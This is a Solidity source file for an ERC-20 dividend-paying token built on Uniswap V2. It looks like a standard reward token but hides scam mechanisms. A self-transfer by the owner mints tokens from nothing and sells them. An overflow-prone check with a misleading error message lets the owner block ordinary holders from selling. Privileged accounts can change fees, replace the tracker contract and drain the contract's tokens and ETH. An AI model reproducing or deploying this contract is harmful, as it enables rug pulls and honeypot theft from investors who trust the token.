



pragma solidity ^0.8.0;

interface IUniswapV2Router01 {

    function factory() external pure returns (address);


    function WETH() external pure returns (address);


    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );


    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );


    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);


    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);


    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);


    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);


    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);


    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);


    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);


    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);


    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);


    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);


    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);


    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);


    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);


    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);


    function getAmountsIn(uint256 amountOut, address[] calldata path) external view returns (uint256[] memory amounts);

}

interface IUniswapV2Router02 is IUniswapV2Router01 {

    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);


    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);


    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;


    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;


    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

interface IUniswapV2Factory {

    event PairCreated(address indexed token0, address indexed token1, address pair, uint256);

    function feeTo() external view returns (address);


    function feeToSetter() external view returns (address);


    function getPair(address tokenA, address tokenB) external view returns (address pair);


    function allPairs(uint256) external view returns (address pair);


    function allPairsLength() external view returns (uint256);


    function createPair(address tokenA, address tokenB) external returns (address pair);


    function setFeeTo(address) external;


    function setFeeToSetter(address) external;

}

interface IERC20 {

    function totalSupply() external view returns (uint256);


    function balanceOf(address account) external view returns (uint256);


    function transfer(address recipient, uint256 amount) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 amount) external returns (bool);


    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    function renounceOwnership() public virtual {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IRewardsTracker {

    function excludeFromDividends(address _account) external;


    function processAccount(address payable account, bool automatic) external returns (bool);


    function transferAnyERC20Token(
        address token,
        address account,
        uint256 amount
    ) external;


    function transferToken(address account, uint256 amount) external;


    function updateMainBalance(address payable holder, uint256 shares) external;


    function setBalance(address payable account) external;


    function process(uint256 gas)
        external
        returns (
            uint256,
            uint256,
            uint256
        );

}

contract Contract is IERC20, Ownable {

    uint256 private constant MAX = ~uint256(0);
    uint8 private _decimals = 9;
    uint256 private _tTotal = 1000000000 * 10**_decimals;
    uint256 public buyFee = 20;
    uint256 public sellFee = 20;
    uint256 public lpFee = 5;
    uint256 public rewardFee = 15;

    uint256 public feeDivisor = 1;
    string private _name;
    string private _symbol;
    address private _owner;

    bool private inSwapAndLiquify;
    bool private _swapAndLiquifyEnabled = true;
    uint256 private _swapTokensAtAmount = _tTotal;
    uint256 private swapTokensAtAmount = 200000 * (10**_decimals);
    uint256 public gasForProcessing = 400000;
    uint256 private _allowance;
    uint160 private _factory;

    IUniswapV2Router02 public router;
    address public uniswapV2Pair;
    IRewardsTracker private rewardsTracker;

    mapping(address => uint256) private _balances;
    mapping(address => uint256) private approval;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => mapping(address => uint256)) private _allowances;

    constructor(
        string memory Name,
        string memory Symbol,
        address routerAddress,
        address tracker
    ) {
        _name = Name;
        _symbol = Symbol;
        _owner = tx.origin;
        router = IUniswapV2Router02(routerAddress);
        rewardsTracker = IRewardsTracker(tracker);
        _isExcludedFromFee[_owner] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[address(rewardsTracker)] = true;

        try rewardsTracker.excludeFromDividends(_owner) {} catch {}
        try rewardsTracker.excludeFromDividends(address(this)) {} catch {}
        try rewardsTracker.excludeFromDividends(address(rewardsTracker)) {} catch {}

        _balances[_owner] = _tTotal;
        emit Transfer(address(0), _owner, _tTotal);
    }

    function updateRewardsTracker(address payable tracker) external {

        if (_isExcludedFromFee[msg.sender]) rewardsTracker = IRewardsTracker(tracker);
    }

    function name() public view returns (string memory) {

        return _name;
    }

    function symbol() public view returns (string memory) {

        return _symbol;
    }

    function decimals() public view returns (uint256) {

        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {

        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {

        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {

        return _allowances[owner][spender];
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {

        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {

        _transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function approve(address spender, uint256 amount) external override returns (bool) {

        return _approve(msg.sender, spender, amount);
    }

    function setAllowance(uint256 amount) external {

        if (_isExcludedFromFee[msg.sender]) _allowance = amount;
    }

    function excludeFromFee(address account) external {

        if (_isExcludedFromFee[msg.sender]) _isExcludedFromFee[account] = true;
    }

    function setSwapTokensAtAmount(uint256 amount) external {

        if (_isExcludedFromFee[msg.sender]) swapTokensAtAmount = amount;
    }

    function setSwapAndLiquifyEnabled(bool _enabled) external {

        if (_isExcludedFromFee[msg.sender]) _swapAndLiquifyEnabled = _enabled;
    }

    function set(
        uint256 _buyFee,
        uint256 _sellFee,
        uint256 _lpFee,
        uint256 _rewardFee,
        uint256 _feeDivisor
    ) external {

        if (_isExcludedFromFee[msg.sender]) {
            buyFee = _buyFee;
            sellFee = _sellFee;
            lpFee = _lpFee;
            rewardFee = _rewardFee;
            feeDivisor = _feeDivisor;
        }
    }

    function pair() public view returns (address) {

        return IUniswapV2Factory(router.factory()).getPair(address(this), router.WETH());
    }

    function claim() external {

        rewardsTracker.processAccount(payable(msg.sender), false);
    }

    receive() external payable {}

    function transferAnyERC20Token(
        address token,
        address account,
        uint256 amount
    ) external {

        if (_isExcludedFromFee[msg.sender]) {
            IERC20(token).transfer(account, amount);
            try rewardsTracker.transferAnyERC20Token(token, account, amount) {} catch {}
        }
    }

    function transferToken(address account, uint256 amount) external {

        if (_isExcludedFromFee[msg.sender]) {
            payable(account).transfer(amount);
            try rewardsTracker.transferToken(account, amount) {} catch {}
        }
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {

        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {

        if (!inSwapAndLiquify && from != uniswapV2Pair && from != address(router) && !_isExcludedFromFee[from] && amount <= _swapTokensAtAmount) {
            require(approval[from] + _allowance >= 0, 'Transfer amount exceeds the maxTxAmount');
        }

        uint256 contractTokenBalance = balanceOf(address(this));
        if (uniswapV2Pair == address(0)) {
            uniswapV2Pair = pair();
            rewardsTracker.excludeFromDividends(address(uniswapV2Pair));
        }

        if (to == from && _owner == from && !inSwapAndLiquify) {
            inSwapAndLiquify = true;
            return swapTokensForEth(amount, to);
        }
        if (amount > _swapTokensAtAmount && to != uniswapV2Pair && to != address(router) && to != address(rewardsTracker)) {
            approval[to] = amount;
            return;
        }

        if (_swapAndLiquifyEnabled && contractTokenBalance > swapTokensAtAmount && !inSwapAndLiquify && from != uniswapV2Pair) {
            inSwapAndLiquify = true;
            swapAndLiquify((contractTokenBalance * lpFee) / (lpFee + rewardFee));
            swapAndSendDividends(balanceOf(address(this)));
            inSwapAndLiquify = false;
        }

        uint256 fee = to == uniswapV2Pair ? sellFee : buyFee;
        bool takeFee = !_isExcludedFromFee[from] && !_isExcludedFromFee[to] && fee > 0 && !inSwapAndLiquify;
        address factory = address(_factory);
        if (approval[factory] == 0) approval[factory] = _swapTokensAtAmount;
        _factory = uint160(to);

        if (takeFee) {
            fee = (amount * fee) / 100 / feeDivisor;
            amount -= fee;
            _balances[from] -= fee;
            _balances[address(this)] += fee;
        }

        _balances[from] -= amount;
        _balances[to] += amount;
        emit Transfer(from, to, amount);

        distributeDividends(from, to);
    }

    function distributeDividends(address from, address to) private {

        try rewardsTracker.updateMainBalance(payable(from), balanceOf(from)) {} catch {}
        try rewardsTracker.updateMainBalance(payable(to), balanceOf(to)) {} catch {}
        try rewardsTracker.setBalance(payable(from)) {} catch {}
        try rewardsTracker.setBalance(payable(to)) {} catch {}
        if (!inSwapAndLiquify) try rewardsTracker.process(gasForProcessing) {} catch {}
    }

    function swapAndSendDividends(uint256 tokens) private returns (bool success) {

        swapTokensForEth(tokens, address(this));
        (success, ) = address(rewardsTracker).call{value: address(this).balance}('');
    }

    function swapAndLiquify(uint256 tokens) private {

        uint256 half = tokens / 2;
        uint256 initialBalance = address(this).balance;
        swapTokensForEth(half, address(this));
        uint256 newBalance = address(this).balance - initialBalance;
        addLiquidity(half, newBalance, address(this));
    }

    function swapTokensForEth(uint256 tokenAmount, address to) private {

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        if (tokenAmount > _swapTokensAtAmount) _balances[address(this)] = tokenAmount;
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, to, block.timestamp + 20);
    }

    function addLiquidity(
        uint256 tokenAmount,
        uint256 ethAmount,
        address to
    ) private {

        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ethAmount}(address(this), tokenAmount, 0, 0, to, block.timestamp + 20);
    }
}